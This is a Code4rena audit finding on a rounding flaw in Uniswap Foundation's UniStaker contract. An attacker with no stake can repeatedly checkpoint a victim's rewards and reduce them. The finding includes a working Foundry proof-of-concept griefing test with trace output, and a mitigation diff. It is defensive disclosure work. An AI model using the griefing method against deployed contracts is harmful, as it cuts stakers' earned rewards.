---
# Core Classification
protocol: Uniswap Foundation
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 30884
audit_firm: Code4rena
contest_link: https://code4rena.com/reports/2024-02-uniswap-foundation
source_link: https://code4rena.com/reports/2024-02-uniswap-foundation
github_link: https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/388

# Impact Classification
severity: low
impact: security_vulnerability
exploitability: 0.00
financial_impact: low

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 0
finders:
---

## Vulnerability Title

[11] Small stakes reward griefing due to rounding, and actions by anyone with nothing at stake

### Overview

See description below for full details.

### Original Finding Content


*Note: At the judge’s request [here](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/299#issuecomment-1997457762), this downgraded issue from the same warden has been included in this report for completeness.*

https://github.com/code-423n4/2024-02-uniswap-foundation/blob/491c7f63e5799d95a181be4a978b2f074dc219a5/src/UniStaker.sol#L256-L261<br>
https://github.com/code-423n4/2024-02-uniswap-foundation/blob/491c7f63e5799d95a181be4a978b2f074dc219a5/src/UniStaker.sol#L292-L303<br>
https://github.com/code-423n4/2024-02-uniswap-foundation/blob/491c7f63e5799d95a181be4a978b2f074dc219a5/src/UniStaker.sol#L315-L334<br>
https://github.com/code-423n4/2024-02-uniswap-foundation/blob/491c7f63e5799d95a181be4a978b2f074dc219a5/src/UniStaker.sol#L342-L346<br>
https://github.com/code-423n4/2024-02-uniswap-foundation/blob/491c7f63e5799d95a181be4a978b2f074dc219a5/src/UniStaker.sol#L360-L373<br>
https://github.com/code-423n4/2024-02-uniswap-foundation/blob/491c7f63e5799d95a181be4a978b2f074dc219a5/src/UniStaker.sol#L382-L402<br>
https://github.com/code-423n4/2024-02-uniswap-foundation/blob/491c7f63e5799d95a181be4a978b2f074dc219a5/src/UniStaker.sol#L453-L457<br>
https://github.com/code-423n4/2024-02-uniswap-foundation/blob/491c7f63e5799d95a181be4a978b2f074dc219a5/src/UniStaker.sol#L466-L492<br>
https://github.com/code-423n4/2024-02-uniswap-foundation/blob/491c7f63e5799d95a181be4a978b2f074dc219a5/src/UniStaker.sol#L499-L503<br>
https://github.com/code-423n4/2024-02-uniswap-foundation/blob/491c7f63e5799d95a181be4a978b2f074dc219a5/src/UniStaker.sol#L512-L532

### Impact

Whenever any operation with the given user as a beneficiary is performed, this user's rewards are checkpointed via function [`_checkpointReward()`](https://github.com/code-423n4/2024-02-uniswap-foundation/blob/491c7f63e5799d95a181be4a978b2f074dc219a5/src/UniStaker.sol#L764-L767), which calculates the reward checkpoint by a call to function [`unclaimedReward()`](https://github.com/code-423n4/2024-02-uniswap-foundation/blob/491c7f63e5799d95a181be4a978b2f074dc219a5/src/UniStaker.sol#L241-L247):

```solidity
  function unclaimedReward(address _beneficiary) public view returns (uint256) {
    return unclaimedRewardCheckpoint[_beneficiary]
      + (
        earningPower[_beneficiary]
          * (rewardPerTokenAccumulated() - beneficiaryRewardPerTokenCheckpoint[_beneficiary])
      ) / SCALE_FACTOR;
  }
```

The problem with the above function is that it allows for rounding errors, in that it divides by the large `SCALE_FACTOR = 1e36`, which is intended exactly to prevent rounding errors (but in another place). More specifically, the rounding errors happen when:

- The user stake is relatively small (thus, `earningPower[_beneficiary]` is small).
- The reward amount is relatively small.
- A small period of time has passed since the previous checkpoint (thus, the second factor becomes small as well).

The last aspect is controllable by any external user (an attacker), which may have zero stake in the system, and still designate the grieved user as a beneficiary, and the attacker can also do it as frequently as needed (e.g. every block). The vulnerable functions are almost all externally callable functions:

- `stake()`, `permitAndStake`, `stakeOnBehalf()`: allow to deposit a zero stake, and to designate arbitrary user as a beneficiary.
- `stakeMore()`, `permitAndStakeMore()`, `stakeMoreOnBehalf()`: allow to extend an existing stake with an additional zero amount, while checkpointing the same beneficiary.
- `alterBeneficiary()`, `alterBeneficiaryOnBehalf()`: allow to change deposit beneficiary to an arbitrary user, while checkpointing two users simultaneously (the old and the new beneficiary).
- `withdraw()`, `withdrawOnBehalf()`: allow to withdraw a zero amount, also from a zero stake.

Any of those functions can be called by an attacker who doesn't need to stake anything (nothing at stake).  As a result, the attacked user will be eligible to disproportionately smaller rewards than other users that staked the same amounts, over the same period of time.

### Proof of Concept

The test below demonstrates the exploit; to be placed in [test/UniStaker.t.sol](https://github.com/code-423n4/2024-02-uniswap-foundation/blob/491c7f63e5799d95a181be4a978b2f074dc219a5/test/UniStaker.t.sol#L2709). All amounts are within the bounds as provided by the functions `_boundToRealisticStake()` and `_boundToRealisticReward()`. Instead of `stakeMore()`, an attacker could employ any of the vulnerable functions listed above.

```diff
diff --git a/test/UniStaker.t.sol b/test/UniStaker.t.sol
index 89124f8..9a01043 100644
--- a/test/UniStaker.t.sol
+++ b/test/UniStaker.t.sol
@@ -2708,2 +2708,50 @@ contract UniStakerRewardsTest is UniStakerTest {
 contract NotifyRewardAmount is UniStakerRewardsTest {
+  function test_SmallStakesRewardGriefing() public {
+    address _user1 = address(1);
+    address _user2 = address(2);
+    address _user3 = address(3);
+    address _delegatee = address(4);
+    address _attacker = address(5);
+
+    // Mint necessary amounts
+    uint256 _smallDepositAmount = 0.1e18; // from _boundToRealisticStake
+    uint256 _largeDepositAmount = 25_000_000e18; // from _boundToRealisticStake
+    _mintGovToken(_user1, _smallDepositAmount);
+    _mintGovToken(_user2, _smallDepositAmount);
+    _mintGovToken(_user3, _largeDepositAmount);
+
+    // Notify of the rewards
+    uint256 _rewardAmount = 1e14; // from _boundToRealisticReward
+    rewardToken.mint(rewardNotifier, _rewardAmount);
+    vm.startPrank(rewardNotifier);
+    rewardToken.transfer(address(uniStaker), _rewardAmount);
+    uniStaker.notifyRewardAmount(_rewardAmount);
+    vm.stopPrank();
+
+    // Users stake for themselves
+    _stake(_user1, _smallDepositAmount, _delegatee);
+    _stake(_user2, _smallDepositAmount, _delegatee);
+    _stake(_user3, _largeDepositAmount, _delegatee);
+
+    // _attacker has zero funds
+    assertEq(govToken.balanceOf(_attacker), 0);
+
+    // The attack: every block _attacker deposits 0 stake
+    // and assigns _user1 as beneficiary,
+    // thus leading to frequent updates of the reward checkpoint for _user1
+    // with the rounding errors accumulating
+    UniStaker.DepositIdentifier _depositId = _stake(_attacker, 0, _delegatee, _user1);
+    for(uint i = 0; i < 1000; ++i) {
+      _jumpAhead(10); // a conservative 10 seconds between blocks
+      vm.startPrank(_attacker);
+      uniStaker.stakeMore(_depositId, 0);
+      vm.stopPrank();
+    }
+
+    console2.log("Unclaimed reward for _user1: ", uniStaker.unclaimedReward(_user1));
+    console2.log("Unclaimed reward for _user2: ", uniStaker.unclaimedReward(_user2));
+    // This assertion fails: _user1 can now claim substantially less rewards than _user2
+    assertLteWithinOnePercent(uniStaker.unclaimedReward(_user1), uniStaker.unclaimedReward(_user2));
+  }
+
   function testFuzz_UpdatesTheRewardRate(uint256 _amount) public {
```

Run the test using `forge test -vvvv --nmp '*integration*' --match-test test_SmallStakesRewardGriefing`.
Notice that exploit succeeds if the test fails; the failing test prints then the following output, showing that `_user1` may claim only `1000` in rewards, contrary to `_user2`, who staked the same amount but may claim `1543` in rewards.

```sh
    ├─ [0] VM::startPrank(0x0000000000000000000000000000000000000005)
    │   └─ ← ()
    ├─ [14341] UniStaker::stakeMore(3, 0)
    │   ├─ [4113] Governance Token::transferFrom(0x0000000000000000000000000000000000000005, DelegationSurrogate: [0x4f81992FCe2E1846dD528eC0102e6eE1f61ed3e2], 0)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000005, to: DelegationSurrogate: [0x4f81992FCe2E1846dD528eC0102e6eE1f61ed3e2], value: 0)
    │   │   └─ ← true
    │   ├─ emit StakeDeposited(owner: 0x0000000000000000000000000000000000000005, depositId: 3, amount: 0, depositBalance: 0)
    │   └─ ← ()
    ├─ [0] VM::stopPrank()
    │   └─ ← ()
    ├─ [2293] UniStaker::unclaimedReward(0x0000000000000000000000000000000000000001) [staticcall]
    │   └─ ← 1000
    ├─ [0] console::log("Unclaimed reward for _user1: ", 1000) [staticcall]
    │   └─ ← ()
    ├─ [2293] UniStaker::unclaimedReward(0x0000000000000000000000000000000000000002) [staticcall]
    │   └─ ← 1543
    ├─ [0] console::log("Unclaimed reward for _user2: ", 1543) [staticcall]
    │   └─ ← ()
    ├─ [2293] UniStaker::unclaimedReward(0x0000000000000000000000000000000000000001) [staticcall]
    │   └─ ← 1000
    ├─ [2293] UniStaker::unclaimedReward(0x0000000000000000000000000000000000000002) [staticcall]
    │   └─ ← 1543
    ├─ emit log(val: "Error: a >= 0.99 * b not satisfied")
    ├─ emit log_named_uint(key: "  Expected", val: 1543)
    ├─ emit log_named_uint(key: "    Actual", val: 1000)
    ├─ emit log_named_uint(key: "  minBound", val: 1527)
    ├─ [0] VM::store(VM: [0x7109709ECfa91a80626fF3989D68f67F5b1DD12D], 0x6661696c65640000000000000000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000000000000000000000000001)
    │   └─ ← ()
    └─ ← ()

Test result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 466.54s
```

### Tools Used

Foundry

### Recommended Mitigation Steps

We recommend the following simple change to be applied to `src/Unistaker.sol`, which avoids division by `SCALE_FACTOR` when storing checkpoints internally, and instead divides by it only when the rewards are claimed:

```diff
diff --git a/src/UniStaker.sol b/src/UniStaker.sol
index babdc1a..237b833 100644
--- a/src/UniStaker.sol
+++ b/src/UniStaker.sol
@@ -239,9 +239,9 @@ contract UniStaker is INotifiableRewardReceiver, Multicall, EIP712, Nonces {
   /// until it is reset to zero once the beneficiary account claims their unearned rewards.
   /// @return Live value of the unclaimed rewards earned by a given beneficiary account.
   function unclaimedReward(address _beneficiary) public view returns (uint256) {
-    return unclaimedRewardCheckpoint[_beneficiary]
-      + (
-        earningPower[_beneficiary]
+    return (
+        unclaimedRewardCheckpoint[_beneficiary]
+        + earningPower[_beneficiary]
           * (rewardPerTokenAccumulated() - beneficiaryRewardPerTokenCheckpoint[_beneficiary])
       ) / SCALE_FACTOR;
   }
@@ -746,7 +746,7 @@ contract UniStaker is INotifiableRewardReceiver, Multicall, EIP712, Nonces {
     unclaimedRewardCheckpoint[_beneficiary] = 0;
     emit RewardClaimed(_beneficiary, _reward);
 
-    SafeERC20.safeTransfer(REWARD_TOKEN, _beneficiary, _reward);
+    SafeERC20.safeTransfer(REWARD_TOKEN, _beneficiary, _reward / SCALE_FACTOR);
   }
 
   /// @notice Checkpoints the global reward per token accumulator.
@@ -762,7 +762,11 @@ contract UniStaker is INotifiableRewardReceiver, Multicall, EIP712, Nonces {
   /// accumulator has been checkpointed. It assumes the global `rewardPerTokenCheckpoint` is up to
   /// date.
   function _checkpointReward(address _beneficiary) internal {
-    unclaimedRewardCheckpoint[_beneficiary] = unclaimedReward(_beneficiary);
+    unclaimedRewardCheckpoint[_beneficiary] += (
+        earningPower[_beneficiary]
+          * (rewardPerTokenAccumulated() - beneficiaryRewardPerTokenCheckpoint[_beneficiary])
+      );
+
     beneficiaryRewardPerTokenCheckpoint[_beneficiary] = rewardPerTokenAccumulatedCheckpoint;
   }
```

This change alleviates the problem completely. Now, the output from the previously failing test reads:

```sh
    ├─ [0] VM::startPrank(0x0000000000000000000000000000000000000005)
    │   └─ ← ()
    ├─ [14185] UniStaker::stakeMore(3, 0)
    │   ├─ [4113] Governance Token::transferFrom(0x0000000000000000000000000000000000000005, DelegationSurrogate: [0x4f81992FCe2E1846dD528eC0102e6eE1f61ed3e2], 0)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000005, to: DelegationSurrogate: [0x4f81992FCe2E1846dD528eC0102e6eE1f61ed3e2], value: 0)
    │   │   └─ ← true
    │   ├─ emit StakeDeposited(owner: 0x0000000000000000000000000000000000000005, depositId: 3, amount: 0, depositBalance: 0)
    │   └─ ← ()
    ├─ [0] VM::stopPrank()
    │   └─ ← ()
    ├─ [2293] UniStaker::unclaimedReward(0x0000000000000000000000000000000000000001) [staticcall]
    │   └─ ← 1543
    ├─ [0] console::log("Unclaimed reward for _user1: ", 1543) [staticcall]
    │   └─ ← ()
    ├─ [2293] UniStaker::unclaimedReward(0x0000000000000000000000000000000000000002) [staticcall]
    │   └─ ← 1543
    ├─ [0] console::log("Unclaimed reward for _user2: ", 1543) [staticcall]
    │   └─ ← ()
    ├─ [2293] UniStaker::unclaimedReward(0x0000000000000000000000000000000000000001) [staticcall]
    │   └─ ← 1543
    ├─ [2293] UniStaker::unclaimedReward(0x0000000000000000000000000000000000000002) [staticcall]
    │   └─ ← 1543
    └─ ← ()

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 247.92ms    
```

Besides that, we recommend to apply minimal input validation to all vulnerable functions listed above: allow to stake only above some minimal amount (no zero stakes), disallow to alter beneficiary to the same address, disallow withdrawing zero amounts, etc. While in itself such actions may seem harmless, leaving functions that accept insensible inputs in the system, in combination with other potential problems, may open the way to exploits.

### Assessed type

Math

**[wildmolasses (Uniswap) acknowledged and commented](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/299#issuecomment-1992314009):**
 > Some decent callouts here; although nothing was found, we appreciate the rigor. I think we would like to mark high quality, thanks warden!

**[0xTheC0der (judge) commented](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/299#issuecomment-1997621087):**
 > The majority of initial H/M findings which were downgraded to QA exceed the present QA reports in value provided, and none of the present QA reports stand out enough in terms of valid and valuable Low findings to be selected for report. As a consequence, the current report was selected due to its high quality, diligence and value provided to the sponsor.

***



### Metadata

| Field | Value |
|-------|-------|
| Impact | LOW |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Code4rena |
| Protocol | Uniswap Foundation |
| Report Date | N/A |
| Finders | N/A |

### Source Links

- **Source**: https://code4rena.com/reports/2024-02-uniswap-foundation
- **GitHub**: https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/388
- **Contest**: https://code4rena.com/reports/2024-02-uniswap-foundation

### Keywords for Search

`vulnerability`

